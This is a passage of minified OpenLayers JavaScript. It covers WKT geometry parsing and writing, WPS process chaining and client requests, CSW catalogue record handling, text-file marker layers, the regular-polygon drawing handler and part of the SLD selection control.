\");if(c=this.regExes.typeStr.exec(a))if(a=c[1].toLowerCase(),c=c[2],this.parse[a]&&(b=this.parse[a].apply(this,[c])),this.internalProjection&&this.externalProjection)if(b&&\n\"OpenLayers.Feature.Vector\"==b.CLASS_NAME)b.geometry.transform(this.externalProjection,this.internalProjection);else if(b&&\"geometrycollection\"!=a&&\"object\"==typeof b)for(a=0,c=b.length;a<c;a++)b[a].geometry.transform(this.externalProjection,this.internalProjection);return b},write:function(a){var b,c;a.constructor==Array?c=!0:(a=[a],c=!1);var d=[];c&&d.push(\"GEOMETRYCOLLECTION(\");for(var e=0,f=a.length;e<f;++e)c&&0<e&&d.push(\",\"),b=a[e].geometry,d.push(this.extractGeometry(b));c&&d.push(\")\");return d.join(\"\")},\nextractGeometry:function(a){var b=a.CLASS_NAME.split(\".\")[2].toLowerCase();if(!this.extract[b])return null;this.internalProjection&&this.externalProjection&&(a=a.clone(),a.transform(this.internalProjection,this.externalProjection));return(\"collection\"==b?\"GEOMETRYCOLLECTION\":b.toUpperCase())+\"(\"+this.extract[b].apply(this,[a])+\")\"},extract:{point:function(a){return a.x+\" \"+a.y},multipoint:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(\"(\"+this.extract.point.apply(this,[a.components[c]])+\n\")\");return b.join(\",\")},linestring:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extract.point.apply(this,[a.components[c]]));return b.join(\",\")},multilinestring:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(\"(\"+this.extract.linestring.apply(this,[a.components[c]])+\")\");return b.join(\",\")},polygon:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(\"(\"+this.extract.linestring.apply(this,[a.components[c]])+\")\");return b.join(\",\")},multipolygon:function(a){for(var b=\n[],c=0,d=a.components.length;c<d;++c)b.push(\"(\"+this.extract.polygon.apply(this,[a.components[c]])+\")\");return b.join(\",\")},collection:function(a){for(var b=[],c=0,d=a.components.length;c<d;++c)b.push(this.extractGeometry.apply(this,[a.components[c]]));return b.join(\",\")}},parse:{point:function(a){a=OpenLayers.String.trim(a).split(this.regExes.spaces);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a[0],a[1]))},multipoint:function(a){for(var b=OpenLayers.String.trim(a).split(\",\"),\nc=[],d=0,e=b.length;d<e;++d)a=b[d].replace(this.regExes.trimParens,\"$1\"),c.push(this.parse.point.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPoint(c))},linestring:function(a){a=OpenLayers.String.trim(a).split(\",\");for(var b=[],c=0,d=a.length;c<d;++c)b.push(this.parse.point.apply(this,[a[c]]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString(b))},multilinestring:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.parenComma),\nc=[],d=0,e=b.length;d<e;++d)a=b[d].replace(this.regExes.trimParens,\"$1\"),c.push(this.parse.linestring.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiLineString(c))},polygon:function(a){var b;a=OpenLayers.String.trim(a).split(this.regExes.parenComma);for(var c=[],d=0,e=a.length;d<e;++d)b=a[d].replace(this.regExes.trimParens,\"$1\"),b=this.parse.linestring.apply(this,[b]).geometry,b=new OpenLayers.Geometry.LinearRing(b.components),c.push(b);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Polygon(c))},\nmultipolygon:function(a){for(var b=OpenLayers.String.trim(a).split(this.regExes.doubleParenComma),c=[],d=0,e=b.length;d<e;++d)a=b[d].replace(this.regExes.trimParens,\"$1\"),c.push(this.parse.polygon.apply(this,[a]).geometry);return new OpenLayers.Feature.Vector(new OpenLayers.Geometry.MultiPolygon(c))},geometrycollection:function(a){a=a.replace(/,\\s*([A-Za-z])/g,\"|$1\");a=OpenLayers.String.trim(a).split(\"|\");for(var b=[],c=0,d=a.length;c<d;++c)b.push(OpenLayers.Format.WKT.prototype.read.apply(this,[a[c]]));\nreturn b}},CLASS_NAME:\"OpenLayers.Format.WKT\"});OpenLayers.WPSProcess=OpenLayers.Class({client:null,server:null,identifier:null,description:null,localWPS:\"http://geoserver/wps\",formats:null,chained:0,executeCallbacks:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.executeCallbacks=[];this.formats={\"application/wkt\":new OpenLayers.Format.WKT,\"application/json\":new OpenLayers.Format.GeoJSON}},describe:function(a){a=a||{};if(!this.description)this.client.describeProcess(this.server,this.identifier,function(b){this.description||this.parseDescription(b);\na.callback&&a.callback.call(a.scope,this.description)},this);else if(a.callback){var b=this.description;window.setTimeout(function(){a.callback.call(a.scope,b)},0)}},configure:function(a){this.describe({callback:function(){var b=this.description,c=a.inputs,d,e,f;e=0;for(f=b.dataInputs.length;e<f;++e)d=b.dataInputs[e],this.setInputData(d,c[d.identifier]);a.callback&&a.callback.call(a.scope)},scope:this});return this},execute:function(a){this.configure({inputs:a.inputs,callback:function(){var b=this,\nc=this.getOutputIndex(b.description.processOutputs,a.output);b.setResponseForm({outputIndex:c});(function e(){OpenLayers.Util.removeItem(b.executeCallbacks,e);0!==b.chained?b.executeCallbacks.push(e):OpenLayers.Request.POST({url:b.client.servers[b.server].url,data:(new OpenLayers.Format.WPSExecute).write(b.description),success:function(e){var g=b.findMimeType(b.description.processOutputs[c].complexOutput.supported.formats);e=b.formats[g].read(e.responseText);e instanceof OpenLayers.Feature.Vector&&\n(e=[e]);a.success&&(g={},g[a.output||\"result\"]=e,a.success.call(a.scope,g))},scope:b})})()},scope:this})},output:function(a){return new OpenLayers.WPSProcess.ChainLink({process:this,output:a})},parseDescription:function(a){a=this.client.servers[this.server];this.description=(new OpenLayers.Format.WPSDescribeProcess).read(a.processDescription[this.identifier]).processDescriptions[this.identifier]},setInputData:function(a,b){delete a.data;delete a.reference;if(b instanceof OpenLayers.WPSProcess.ChainLink)++this.chained,\na.reference={method:\"POST\",href:b.process.server===this.server?this.localWPS:this.client.servers[b.process.server].url},b.process.describe({callback:function(){--this.chained;this.chainProcess(a,b)},scope:this});else{a.data={};var c=a.complexData;c?(c=this.findMimeType(c.supported.formats),a.data.complexData={mimeType:c,value:this.formats[c].write(this.toFeatures(b))}):a.data.literalData={value:b}}},setResponseForm:function(a){a=a||{};var b=this.description.processOutputs[a.outputIndex||0];this.description.responseForm=\n{rawDataOutput:{identifier:b.identifier,mimeType:this.findMimeType(b.complexOutput.supported.formats,a.supportedFormats)}}},getOutputIndex:function(a,b){var c;if(b)for(var d=a.length-1;0<=d;--d){if(a[d].identifier===b){c=d;break}}else c=0;return c},chainProcess:function(a,b){var c=this.getOutputIndex(b.process.description.processOutputs,b.output);a.reference.mimeType=this.findMimeType(a.complexData.supported.formats,b.process.description.processOutputs[c].complexOutput.supported.formats);var d={};\nd[a.reference.mimeType]=!0;b.process.setResponseForm({outputIndex:c,supportedFormats:d});for(a.reference.body=b.process.description;0<this.executeCallbacks.length;)this.executeCallbacks[0]()},toFeatures:function(a){var b=OpenLayers.Util.isArray(a);b||(a=[a]);for(var c=Array(a.length),d,e=0,f=a.length;e<f;++e)d=a[e],c[e]=d instanceof OpenLayers.Feature.Vector?d:new OpenLayers.Feature.Vector(d);return b?c:c[0]},findMimeType:function(a,b){b=b||this.formats;for(var c in a)if(c in b)return c},CLASS_NAME:\"OpenLayers.WPSProcess\"});\nOpenLayers.WPSProcess.ChainLink=OpenLayers.Class({process:null,output:null,initialize:function(a){OpenLayers.Util.extend(this,a)},CLASS_NAME:\"OpenLayers.WPSProcess.ChainLink\"});OpenLayers.WPSClient=OpenLayers.Class({servers:null,version:\"1.0.0\",lazy:!1,events:null,initialize:function(a){OpenLayers.Util.extend(this,a);this.events=new OpenLayers.Events(this);this.servers={};for(var b in a.servers)this.servers[b]=\"string\"==typeof a.servers[b]?{url:a.servers[b],version:this.version,processDescription:{}}:a.servers[b]},execute:function(a){this.getProcess(a.server,a.process).execute({inputs:a.inputs,success:a.success,scope:a.scope})},getProcess:function(a,b){var c=new OpenLayers.WPSProcess({client:this,\nserver:a,identifier:b});this.lazy||c.describe();return c},describeProcess:function(a,b,c,d){var e=this.servers[a];e.processDescription[b]?window.setTimeout(function(){c.call(d,e.processDescription[b])},0):b in e.processDescription?this.events.register(\"describeprocess\",this,function g(a){a.identifier===b&&(this.events.unregister(\"describeprocess\",this,g),c.call(d,a.raw))}):(e.processDescription[b]=null,OpenLayers.Request.GET({url:e.url,params:{SERVICE:\"WPS\",VERSION:e.version,REQUEST:\"DescribeProcess\",\nIDENTIFIER:b},success:function(a){e.processDescription[b]=a.responseText;this.events.triggerEvent(\"describeprocess\",{identifier:b,raw:a.responseText})},scope:this}))},destroy:function(){this.events.destroy();this.servers=this.events=null},CLASS_NAME:\"OpenLayers.WPSClient\"});OpenLayers.Format.CSWGetRecords.v2_0_2=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{csw:\"http://www.opengis.net/cat/csw/2.0.2\",dc:\"http://purl.org/dc/elements/1.1/\",dct:\"http://purl.org/dc/terms/\",gmd:\"http://www.isotc211.org/2005/gmd\",geonet:\"http://www.fao.org/geonetwork\",ogc:\"http://www.opengis.net/ogc\",ows:\"http://www.opengis.net/ows\",xlink:\"http://www.w3.org/1999/xlink\",xsi:\"http://www.w3.org/2001/XMLSchema-instance\"},defaultPrefix:\"csw\",version:\"2.0.2\",schemaLocation:\"http://www.opengis.net/cat/csw/2.0.2 http://schemas.opengis.net/csw/2.0.2/CSW-discovery.xsd\",\nrequestId:null,resultType:null,outputFormat:null,outputSchema:null,startPosition:null,maxRecords:null,DistributedSearch:null,ResponseHandler:null,Query:null,regExes:{trimSpace:/^\\s*|\\s*$/g,removeSpace:/\\s*/g,splitSpace:/\\s+/,trimComma:/\\s*,\\s*/g},initialize:function(a){OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&&9==a.nodeType&&(a=a.documentElement);var b={};this.readNode(a,b);return b},\nreaders:{csw:{GetRecordsResponse:function(a,b){b.records=[];this.readChildNodes(a,b);var c=this.getAttributeNS(a,\"\",\"version\");\"\"!=c&&(b.version=c)},RequestId:function(a,b){b.RequestId=this.getChildValue(a)},SearchStatus:function(a,b){b.SearchStatus={};var c=this.getAttributeNS(a,\"\",\"timestamp\");\"\"!=c&&(b.SearchStatus.timestamp=c)},SearchResults:function(a,b){this.readChildNodes(a,b);for(var c=a.attributes,d={},e=0,f=c.length;e<f;++e)d[c[e].name]=\"numberOfRecordsMatched\"==c[e].name||\"numberOfRecordsReturned\"==\nc[e].name||\"nextRecord\"==c[e].name?parseInt(c[e].nodeValue):c[e].nodeValue;b.SearchResults=d},SummaryRecord:function(a,b){var c={type:\"SummaryRecord\"};this.readChildNodes(a,c);b.records.push(c)},BriefRecord:function(a,b){var c={type:\"BriefRecord\"};this.readChildNodes(a,c);b.records.push(c)},DCMIRecord:function(a,b){var c={type:\"DCMIRecord\"};this.readChildNodes(a,c);b.records.push(c)},Record:function(a,b){var c={type:\"Record\"};this.readChildNodes(a,c);b.records.push(c)},\"*\":function(a,b){var c=a.localName||\na.nodeName.split(\":\").pop();b[c]=this.getChildValue(a)}},geonet:{info:function(a,b){var c={};this.readChildNodes(a,c);b.gninfo=c}},dc:{\"*\":function(a,b){var c=a.localName||a.nodeName.split(\":\").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);for(var d={},e=a.attributes,f=0,g=e.length;f<g;++f)d[e[f].name]=e[f].nodeValue;d.value=this.getChildValue(a);\"\"!=d.value&&b[c].push(d)}},dct:{\"*\":function(a,b){var c=a.localName||a.nodeName.split(\":\").pop();OpenLayers.Util.isArray(b[c])||(b[c]=[]);b[c].push(this.getChildValue(a))}},\nows:OpenLayers.Util.applyDefaults({BoundingBox:function(a,b){b.bounds&&(b.BoundingBox=[{crs:b.projection,value:[b.bounds.left,b.bounds.bottom,b.bounds.right,b.bounds.top]}],delete b.projection,delete b.bounds);OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows.BoundingBox.apply(this,arguments)}},OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows)},write:function(a){a=this.writeNode(\"csw:GetRecords\",a);a.setAttribute(\"xmlns:gmd\",this.namespaces.gmd);return OpenLayers.Format.XML.prototype.write.apply(this,\n[a])},writers:{csw:{GetRecords:function(a){a||(a={});var b=this.createElementNSPlus(\"csw:GetRecords\",{attributes:{service:\"CSW\",version:this.version,requestId:a.requestId||this.requestId,resultType:a.resultType||this.resultType,outputFormat:a.outputFormat||this.outputFormat,outputSchema:a.outputSchema||this.outputSchema,startPosition:a.startPosition||this.startPosition,maxRecords:a.maxRecords||this.maxRecords}});(a.DistributedSearch||this.DistributedSearch)&&this.writeNode(\"csw:DistributedSearch\",\na.DistributedSearch||this.DistributedSearch,b);var c=a.ResponseHandler||this.ResponseHandler;if(OpenLayers.Util.isArray(c)&&0<c.length)for(var d=0,e=c.length;d<e;d++)this.writeNode(\"csw:ResponseHandler\",c[d],b);this.writeNode(\"Query\",a.Query||this.Query,b);return b},DistributedSearch:function(a){return this.createElementNSPlus(\"csw:DistributedSearch\",{attributes:{hopCount:a.hopCount}})},ResponseHandler:function(a){return this.createElementNSPlus(\"csw:ResponseHandler\",{value:a.value})},Query:function(a){a||\n(a={});var b=this.createElementNSPlus(\"csw:Query\",{attributes:{typeNames:a.typeNames||\"csw:Record\"}}),c=a.ElementName;if(OpenLayers.Util.isArray(c)&&0<c.length)for(var d=0,e=c.length;d<e;d++)this.writeNode(\"csw:ElementName\",c[d],b);else this.writeNode(\"csw:ElementSetName\",a.ElementSetName||{value:\"summary\"},b);a.Constraint&&this.writeNode(\"csw:Constraint\",a.Constraint,b);a.SortBy&&this.writeNode(\"ogc:SortBy\",a.SortBy,b);return b},ElementName:function(a){return this.createElementNSPlus(\"csw:ElementName\",\n{value:a.value})},ElementSetName:function(a){return this.createElementNSPlus(\"csw:ElementSetName\",{attributes:{typeNames:a.typeNames},value:a.value})},Constraint:function(a){var b=this.createElementNSPlus(\"csw:Constraint\",{attributes:{version:a.version}});if(a.Filter){var c=new OpenLayers.Format.Filter({version:a.version});b.appendChild(c.write(a.Filter))}else a.CqlText&&(a=this.createElementNSPlus(\"CqlText\",{value:a.CqlText.value}),b.appendChild(a));return b}},ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc},\nCLASS_NAME:\"OpenLayers.Format.CSWGetRecords.v2_0_2\"});/*\n Apache 2 \n\n Contains portions of Rico <http://openrico.org/>\n\n Copyright 2005 Sabre Airline Solutions  \n\n Licensed under the Apache License, Version 2.0 (the \"License\"); you\n may not use this file except in compliance with the License. You\n may obtain a copy of the License at\n\n     http://www.apache.org/licenses/LICENSE-2.0  \n\n Unless required by applicable law or agreed to in writing, software\n distributed under the License is distributed on an \"AS IS\" BASIS,\n WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n implied. See the License for the specific language governing\n permissions and limitations under the License. \n*/\nOpenLayers.Marker.Box=OpenLayers.Class(OpenLayers.Marker,{bounds:null,div:null,initialize:function(a,b,c){this.bounds=a;this.div=OpenLayers.Util.createDiv();this.div.style.overflow=\"hidden\";this.events=new OpenLayers.Events(this,this.div);this.setBorder(b,c)},destroy:function(){this.div=this.bounds=null;OpenLayers.Marker.prototype.destroy.apply(this,arguments)},setBorder:function(a,b){a||(a=\"red\");b||(b=2);this.div.style.border=b+\"px solid \"+a},draw:function(a,b){OpenLayers.Util.modifyDOMElement(this.div,\nnull,a,b);return this.div},onScreen:function(){var a=!1;this.map&&(a=this.map.getExtent().containsBounds(this.bounds,!0,!0));return a},display:function(a){this.div.style.display=a?\"\":\"none\"},CLASS_NAME:\"OpenLayers.Marker.Box\"});OpenLayers.Format.Text=OpenLayers.Class(OpenLayers.Format,{defaultStyle:null,extractStyles:!0,initialize:function(a){a=a||{};!1!==a.extractStyles&&(a.defaultStyle={externalGraphic:OpenLayers.Util.getImageLocation(\"marker.png\"),graphicWidth:21,graphicHeight:25,graphicXOffset:-10.5,graphicYOffset:-12.5});OpenLayers.Format.prototype.initialize.apply(this,[a])},read:function(a){a=a.split(\"\\n\");for(var b,c=[],d=0;d<a.length-1;d++){var e=a[d].replace(/^\\s*/,\"\").replace(/\\s*$/,\"\");if(\"#\"!=e.charAt(0))if(b){for(var e=\ne.split(\"\\t\"),f=new OpenLayers.Geometry.Point(0,0),g={},h=this.defaultStyle?OpenLayers.Util.applyDefaults({},this.defaultStyle):null,k=!1,l=0;l<e.length;l++)if(e[l])if(\"point\"==b[l])k=e[l].split(\",\"),f.y=parseFloat(k[0]),f.x=parseFloat(k[1]),k=!0;else if(\"lat\"==b[l])f.y=parseFloat(e[l]),k=!0;else if(\"lon\"==b[l])f.x=parseFloat(e[l]),k=!0;else if(\"title\"==b[l])g.title=e[l];else if(\"image\"==b[l]||\"icon\"==b[l]&&h)h.externalGraphic=e[l];else if(\"iconSize\"==b[l]&&h){var m=e[l].split(\",\");h.graphicWidth=\nparseFloat(m[0]);h.graphicHeight=parseFloat(m[1])}else\"iconOffset\"==b[l]&&h?(m=e[l].split(\",\"),h.graphicXOffset=parseFloat(m[0]),h.graphicYOffset=parseFloat(m[1])):\"description\"==b[l]?g.description=e[l]:\"overflow\"==b[l]?g.overflow=e[l]:g[b[l]]=e[l];k&&(this.internalProjection&&this.externalProjection&&f.transform(this.externalProjection,this.internalProjection),e=new OpenLayers.Feature.Vector(f,g,h),c.push(e))}else b=e.split(\"\\t\")}return c},CLASS_NAME:\"OpenLayers.Format.Text\"});OpenLayers.Layer.Text=OpenLayers.Class(OpenLayers.Layer.Markers,{location:null,features:null,formatOptions:null,selectedFeature:null,initialize:function(a,b){OpenLayers.Layer.Markers.prototype.initialize.apply(this,arguments);this.features=[]},destroy:function(){OpenLayers.Layer.Markers.prototype.destroy.apply(this,arguments);this.clearFeatures();this.features=null},loadText:function(){this.loaded||null==this.location||(this.events.triggerEvent(\"loadstart\"),OpenLayers.Request.GET({url:this.location,\nsuccess:this.parseData,failure:function(a){this.events.triggerEvent(\"loadend\")},scope:this}),this.loaded=!0)},moveTo:function(a,b,c){OpenLayers.Layer.Markers.prototype.moveTo.apply(this,arguments);this.visibility&&!this.loaded&&this.loadText()},parseData:function(a){a=a.responseText;var b={};OpenLayers.Util.extend(b,this.formatOptions);this.map&&!this.projection.equals(this.map.getProjectionObject())&&(b.externalProjection=this.projection,b.internalProjection=this.map.getProjectionObject());a=(new OpenLayers.Format.Text(b)).read(a);\nfor(var b=0,c=a.length;b<c;b++){var d={},e=a[b],f,g,h;f=new OpenLayers.LonLat(e.geometry.x,e.geometry.y);e.style.graphicWidth&&e.style.graphicHeight&&(g=new OpenLayers.Size(e.style.graphicWidth,e.style.graphicHeight));void 0!==e.style.graphicXOffset&&void 0!==e.style.graphicYOffset&&(h=new OpenLayers.Pixel(e.style.graphicXOffset,e.style.graphicYOffset));null!=e.style.externalGraphic?d.icon=new OpenLayers.Icon(e.style.externalGraphic,g,h):(d.icon=OpenLayers.Marker.defaultIcon(),null!=g&&d.icon.setSize(g));\nnull!=e.attributes.title&&null!=e.attributes.description&&(d.popupContentHTML=\"<h2>\"+e.attributes.title+\"</h2><p>\"+e.attributes.description+\"</p>\");d.overflow=e.attributes.overflow||\"auto\";d=new OpenLayers.Feature(this,f,d);this.features.push(d);f=d.createMarker();null!=e.attributes.title&&null!=e.attributes.description&&f.events.register(\"click\",d,this.markerClick);this.addMarker(f)}this.events.triggerEvent(\"loadend\")},markerClick:function(a){var b=this==this.layer.selectedFeature;this.layer.selectedFeature=\nb?null:this;for(var c=0,d=this.layer.map.popups.length;c<d;c++)this.layer.map.removePopup(this.layer.map.popups[c]);b||this.layer.map.addPopup(this.createPopup());OpenLayers.Event.stop(a)},clearFeatures:function(){if(null!=this.features)for(;0<this.features.length;){var a=this.features[0];OpenLayers.Util.removeItem(this.features,a);a.destroy()}},CLASS_NAME:\"OpenLayers.Layer.Text\"});OpenLayers.Handler.RegularPolygon=OpenLayers.Class(OpenLayers.Handler.Drag,{sides:4,radius:null,snapAngle:null,snapToggle:\"shiftKey\",layerOptions:null,persist:!1,irregular:!1,citeCompliant:!1,angle:null,fixedRadius:!1,feature:null,layer:null,origin:null,initialize:function(a,b,c){c&&c.layerOptions&&c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style[\"default\"],{}));OpenLayers.Handler.Drag.prototype.initialize.apply(this,[a,b,c]);this.options=c?c:{}},setOptions:function(a){OpenLayers.Util.extend(this.options,\na);OpenLayers.Util.extend(this,a)},activate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.activate.apply(this,arguments)&&(a=OpenLayers.Util.extend({displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant},this.layerOptions),this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a),this.map.addLayer(this.layer),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Handler.Drag.prototype.deactivate.apply(this,arguments)&&(this.dragging&&this.cancel(),\nnull!=this.layer.map&&(this.layer.destroy(!1),this.feature&&this.feature.destroy()),this.feature=this.layer=null,a=!0);return a},down:function(a){this.fixedRadius=!!this.radius;a=this.layer.getLonLatFromViewPortPx(a.xy);this.origin=new OpenLayers.Geometry.Point(a.lon,a.lat);if(!this.fixedRadius||this.irregular)this.radius=this.map.getResolution();this.persist&&this.clear();this.feature=new OpenLayers.Feature.Vector;this.createGeometry();this.callback(\"create\",[this.origin,this.feature]);this.layer.addFeatures([this.feature],\n{silent:!0});this.layer.drawFeature(this.feature,this.style)},move:function(a){var b=this.layer.getLonLatFromViewPortPx(a.xy),b=new OpenLayers.Geometry.Point(b.lon,b.lat);this.irregular?(a=Math.sqrt(2)*Math.abs(b.y-this.origin.y)/2,this.radius=Math.max(this.map.getResolution()/2,a)):this.fixedRadius?this.origin=b:(this.calculateAngle(b,a),this.radius=Math.max(this.map.getResolution()/2,b.distanceTo(this.origin)));this.modifyGeometry();if(this.irregular){a=b.x-this.origin.x;var b=b.y-this.origin.y,\nc;c=0==b?a/(this.radius*Math.sqrt(2)):a/b;this.feature.geometry.resize(1,this.origin,c);this.feature.geometry.move(a/2,b/2)}this.layer.drawFeature(this.feature,this.style)},up:function(a){this.finalize();this.start==this.last&&this.callback(\"done\",[a.xy])},out:function(a){this.finalize()},createGeometry:function(){this.angle=Math.PI*(1/this.sides-0.5);this.snapAngle&&(this.angle+=this.snapAngle*(Math.PI/180));this.feature.geometry=OpenLayers.Geometry.Polygon.createRegularPolygon(this.origin,this.radius,\nthis.sides,this.snapAngle)},modifyGeometry:function(){var a,b,c=this.feature.geometry.components[0];c.components.length!=this.sides+1&&(this.createGeometry(),c=this.feature.geometry.components[0]);for(var d=0;d<this.sides;++d)b=c.components[d],a=this.angle+2*d*Math.PI/this.sides,b.x=this.origin.x+this.radius*Math.cos(a),b.y=this.origin.y+this.radius*Math.sin(a),b.clearBounds()},calculateAngle:function(a,b){var c=Math.atan2(a.y-this.origin.y,a.x-this.origin.x);if(this.snapAngle&&this.snapToggle&&!b[this.snapToggle]){var d=\nMath.PI/180*this.snapAngle;this.angle=Math.round(c/d)*d}else this.angle=c},cancel:function(){this.callback(\"cancel\",null);this.finalize()},finalize:function(){this.origin=null;this.radius=this.options.radius},clear:function(){this.layer&&(this.layer.renderer.clear(),this.layer.destroyFeatures())},callback:function(a,b){this.callbacks[a]&&this.callbacks[a].apply(this.control,[this.feature.geometry.clone()]);this.persist||\"done\"!=a&&\"cancel\"!=a||this.clear()},CLASS_NAME:\"OpenLayers.Handler.RegularPolygon\"});OpenLayers.Control.SLDSelect=OpenLayers.Class(OpenLayers.Control,{clearOnDeactivate:!1,layers:null,callbacks:null,selectionSymbolizer:{Polygon:{fillColor:\"#FF0000\",stroke:!1},Line:{strokeColor:\"#FF0000\",strokeWidth:2},Point:{graphicName:\"square\",fillColor:\"#FF0000\",pointRadius:5}},layerOptions:null,sketchStyle:null,wfsCache:{},layerCache:{},initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.callbacks=OpenLayers.Util.extend({done:this.select,click:this.select},this.callbacks);\nthis.handlerOptions=this.handlerOptions||{};this.layerOptions=OpenLayers.Util.applyDefaults(this.layerOptions,{displayInLayerSwitcher:!1,tileOptions:{maxGetUrlLength:2048}});this.sketchStyle&&(this.handlerOptions.layerOptions=OpenLayers.Util.applyDefaults(this.handlerOptions.layerOptions,{styleMap:new OpenLayers.StyleMap({\"default\":this.sketchStyle})}));this.handler=new a(this,this.callbacks,this.handlerOptions)},destroy:function(){for(var a in this.layerCache)delete this.layerCache[a];for(a in this.wfsCache)delete this.wfsCache[a];\nOpenLayers.Control.prototype.destroy.apply(this,arguments)},coupleLayerVisiblity:function(a){this.setVisibility(a.object.getVisibility())},createSelectionLayer:function(a){var b;if(this.layerCache[a.id])b=this.layerCache[a.id];else{b=new OpenLayers.Layer.WMS(a.name,a.url,a.params,OpenLayers.Util.applyDefaults(this.layerOptions,a.getOptions()));this.layerCache[a.id]=b;if(!1===this.layerOptions.displayInLayerSwitcher)a.events.on({visibilitychanged:this.coupleLayerVisiblity,scope:b});this.map.addLayer(b)}return b},\ncreateSLD:function(a,b,c){for(var d={version:\"1.0.0\",namedLayers:{}},e=(\"\"+a.params.LAYERS).split(\",\"),f=0,g=e.length;f<g;f++){var h=e[f];d.namedLayers[h]={name:h,userStyles:[]};var k=this.selectionSymbolizer,l=c[f];0<=l.type.indexOf(\"Polygon\")?k={Polygon:this.selectionSymbolizer.Polygon}:0<=l.type.indexOf(\"LineString\")?k={Line:this.selectionSymbolizer.Line}:0<=l.type.indexOf(\"Point\")&&(k={Point:this.selectionSymbolizer.Point});d.namedLayers[h].userStyles.push({name:\"default\",rules:[new OpenLayers.Rule({symbolizer:k,\nfilter:b[f],maxScaleDenominator:a.options.minScale})]})}return(new OpenLayers.Format.SLD({srsName:this.map.getProjection()})).write(d)},parseDescribeLayer:function(a){var b=new OpenLayers.Format.WMSDescribeLayer,c=a.responseXML;c&&c.documentElement||(c=a.responseText);a=b.read(c);for(var b=[],c=null,d=0,e=a.length;d<e;d++)\"WFS\"==a[d].owsType&&(b.push(a[d].typeName),c=a[d].owsURL);OpenLayers.Request.GET({url:c,params:{SERVICE:\"WFS\",TYPENAME:b.toString(),REQUEST:\"DescribeFeatureType\",VERSION:\"1.0.0\"},\ncallback:function(a){var b=new OpenLayers.Format.WFSDescribeFeatureType,c=a.responseXML;c&&c.documentElement||(c=a.responseText);a=b.read(c);this.control.wfsCache[this.layer.id]=a;this.control._queue&&this.control.applySelection()},scope:this})},getGeometryAttributes:function(a){var b=[];a=this.wfsCache[a.id];for(var c=0,d=a.featureTypes.length;c<d;c++)for(var e=a.featureTypes[c].properties,f=0,g=e.length;f<g;f++){var h=e[f],k=h.type;(0<=k.indexOf(\"LineString\")||0<=k.indexOf(\"GeometryAssociationType\")||\n0<=k.indexOf(\"GeometryPropertyType\")||0<=k.indexOf(\"Point\")||0<=k.indexOf(\"Polygon\"))&&b.push(h)}return b},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a)for(var b=0,c=this.layers.length;b<c;b++){var d=this.layers[b];d&&!this.wfsCache[d.id]&&OpenLayers.Request.GET({url:d.url,params:{SERVICE:\"WMS\",VERSION:d.params.VERSION,LAYERS:d.params.LAYERS,REQUEST:\"DescribeLayer\"},callback:this.parseDescribeLayer,scope:{layer:d,control:this}})}return a},deactivate:function(){var a=\nOpenLayers.Control.prototype.deactivate.call(this);if(a)for(var b=0,c=this.layers.length;b<c;b++){var d=this.layers[b];if(d&&!0===this.clearOnDeactivate){var e=this.layerCache,f=e[d.id];f&&(d.events.un({visibilitychanged:this.coupleLayerVisiblity,scope:f}),f.destroy(),delete e[d.id])}}return a},setLayers:function(a){this.active?(this.deactivate(),this.layers=a,this.activate()):this.layers=a},createFilter:function(a,b){var c=null;this.handler instanceof OpenLayers.Handler.RegularPolygon?c=!0===this.handler.irregular?\nnew OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.BBOX,property:a.name,value:b.getBounds()}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Polygon?c=new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Path?c=0<=a.type.indexOf(\"Point\")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,\nproperty:a.name,distance:0.01*this.map.getExtent().getWidth(),distanceUnits:this.map.getUnits(),value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):this.handler instanceof OpenLayers.Handler.Click&&(c=0<=a.type.indexOf(\"Polygon\")?new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.INTERSECTS,property:a.name,value:b}):new OpenLayers.Filter.Spatial({type:OpenLayers.Filter.Spatial.DWITHIN,property:a.name,distance:0.01*this.map.getExtent().getWidth(),\ndistanceUnits:this.map.getUnits(),value:b}));return c},select:function(a){this._queue=function(){for(var b=0,c=this.layers.length;b<c;b++){for(var d=this.layers[b],e=this.getGeometryAttributes(d),f=[],g=0,h=e.length;g<h;g++){var k=e[g];if(null!==k){if(!(a instanceof OpenLayers.Geometry)){var l=this.map.getLonLatFromPixel(a.xy);a=new 